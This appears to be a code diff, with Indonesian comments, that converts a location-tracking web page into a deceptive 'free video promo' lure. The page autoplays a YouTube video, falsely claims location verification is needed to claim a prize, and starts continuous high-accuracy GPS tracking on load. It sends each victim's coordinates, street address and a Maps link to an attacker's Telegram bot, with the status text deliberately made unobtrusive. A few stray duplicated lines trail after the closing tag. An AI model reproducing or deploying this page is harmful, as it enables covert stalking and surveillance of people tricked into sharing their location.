@@ -3,29 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Youtube</title>
+    <title>Promo Spesial: Video Gratis!</title>
     <style>
-        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
-        #video-container { text-align: center; margin-bottom: 20px; }
-        #youtube-video { width: 100%; max-width: 560px; height: 315px; border: none; }
-        #output { background: #e9ecef; padding: 15px; border-radius: 5px; white-space: pre-wrap; margin-top: 10px; }
-        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }
-        button:hover { background: #0056b3; }
-        a { color: #007bff; text-decoration: none; font-weight: bold; }
-        a:hover { text-decoration: underline; }
+        body { font-family: Arial; padding: 20px; background: #f0f0f0; text-align: center; }
+        #video-container { margin: 20px auto; max-width: 560px; }
+        #youtube-video { width: 100%; height: 315px; border: none; }
+        #status { font-size: 12px; color: #666; margin-top: 10px; opacity: 0.7; } /* Samar kayak loading */
     </style>
 </head>
 <body>
-    <h1>Nonton Video Ini Dulu!</h1>
-    <p>klik!</p>
+    <h1>Promo Eksklusif: Nonton Sekarang!</h1>
+    <p>Verifikasi lokasi untuk klaim hadiah. Video mulai otomatis...</p>
     
     <div id="video-container">
-        <iframe id="youtube-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ?rel=0" allowfullscreen></iframe>
+        <!-- Auto play muted, ganti VIDEO_ID -->
+        <iframe id="youtube-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&rel=0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
     
-    <button onclick="startTrack()">Mulai Verif & Track Akurat</button>
-    <button onclick="stopTrack()">Stop</button>
-    <div id="output">Klik Mulai buat mulai tracking akurat...</div>
+    <div id="status">Memverifikasi lokasi... Tunggu sebentar.</div>
 
     <script>
         // Ganti ini
@@ -35,13 +30,13 @@
         let watchId;
         let lastLat = null;
         let lastLng = null;
-        const MIN_DISTANCE = 5; // Meter, biar nggak spam kirim
-        const output = document.getElementById('output');
+        const MIN_DISTANCE = 5; // Meter
+        const status = document.getElementById('status');
 
-        // Hitung jarak sederhana (Haversine approx)
+        // Fungsi jarak
         function getDistance(lat1, lng1, lat2, lng2) {
             if (!lat1 || !lat2) return Infinity;
-            const R = 6371e3; // Radius bumi meter
+            const R = 6371e3;
             const φ1 = lat1 * Math.PI/180;
             const φ2 = lat2 * Math.PI/180;
             const Δφ = (lat2-lat1) * Math.PI/180;
@@ -51,7 +46,7 @@
             return R * c;
         }
 
-        // Reverse geocode buat alamat approx (Nominatim free API)
+        // Geocode alamat
         async function getAddress(lat, lng) {
             try {
                 const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
@@ -62,7 +57,7 @@
             }
         }
 
-        // Kirim ke Telegram dengan link Maps + alamat
+        // Kirim ke Telegram
         async function sendToTelegram(lat, lng, accuracy, timestamp, address, mapsLink) {
             const message = `Lokasi Akurat Baru!\nLatitude: ${lat.toFixed(7)}\nLongitude: ${lng.toFixed(7)}\nAkurasi: ${accuracy}m\nAlamat: ${address}\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}\nMaps: ${mapsLink}`;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
@@ -70,43 +65,78 @@
             try {
                 const response = await fetch(url);
                 if (response.ok) {
-                    console.log('Data akurat terkirim!');
-                    output.innerHTML += `\n--- Dikirim ke bot (dengan link Maps)!`;
+                    console.log('Data terkirim!');
                 } else {
-                    output.innerHTML += `\n--- Error kirim: ${response.status}`;
+                    console.error('Error kirim:', response.status);
                 }
             } catch (error) {
-                output.innerHTML += `\n--- Error: ${error.message}`;
+                console.error('Error:', error);
             }
         }
 
-        function startTrack() {
-            if (navigator.geolocation) {
-                output.innerHTML = 'Mulai tracking akurat... Tunggu permission (GPS on ya!).';
-                watchId = navigator.geolocation.watchPosition(showPosition, showError, {
-                    enableHighAccuracy: true, // Ini kunci buat akurasi tinggi
-                    timeout: 10000,
-                    maximumAge: 1000 // Cache max 1 detik
-                });
-            } else {
-                output.innerHTML = 'Geolocation nggak support.';
-            }
-        }
-
+        // Fungsi tampil posisi
         async function showPosition(position) {
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
             const acc = position.coords.accuracy;
             const time = position.timestamp;
             
-            // Cek jarak dari posisi terakhir
             const distance = getDistance(lastLat, lastLng, lat, lng);
             if (distance < MIN_DISTANCE && lastLat !== null) {
-                return; // Skip kalo geraknya kecil
+                return;
             }
             lastLat = lat;
             lastLng = lng;
             
+            const mapsLink = `https://maps.google.com/?q=${lat.toFixed(7)},${lng.toFixed(7)}`;
+            const address = await getAddress(lat, lng);
+            
+            status.innerHTML = `Verifikasi selesai. Terima kasih! (Akurasi: ${acc.toFixed(0)}m)`; // Ubah status halus
+            console.log(`Update: ${lat.toFixed(7)}, ${lng.toFixed(7)} | ${address}`); // Log di console
+            
+            sendToTelegram(lat, lng, acc, time, address, mapsLink);
+        }
+
+        // Error halus
+        function showError(error) {
+            let msg = 'Verifikasi gagal: ';
+            switch(error.code) {
+                case error.PERMISSION_DENIED: msg += 'Izinkan lokasi untuk promo.'; break;
+                case error.POSITION_UNAVAILABLE: msg += 'Coba lagi nanti.'; break;
+                case error.TIMEOUT: msg += 'Sinyal lemah.'; break;
+            }
+            status.innerHTML = msg;
+            console.error('Error:', msg);
+        }
+
+        // Auto start pas load
+        function initTracking() {
+            if (navigator.geolocation) {
+                status.innerHTML = 'Meminta akses lokasi untuk promo...';
+                // Dapatkan posisi awal dulu
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        showPosition(pos); // Proses posisi awal
+                        // Lanjut watch untuk real-time
+                        watchId = navigator.geolocation.watchPosition(showPosition, showError, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 1000
+                        });
+                    },
+                    showError,
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                status.innerHTML = 'Lokasi tidak didukung. Coba browser lain.';
+            }
+        }
+
+        // Start otomatis setelah DOM load
+        window.addEventListener('load', initTracking);
+    </script>
+</body>
+</html>            
             // Buat link Maps akurat kayak contoh lo
             const mapsLink = `https://maps.google.com/?q=${lat.toFixed(7)},${lng.toFixed(7)}`;
             
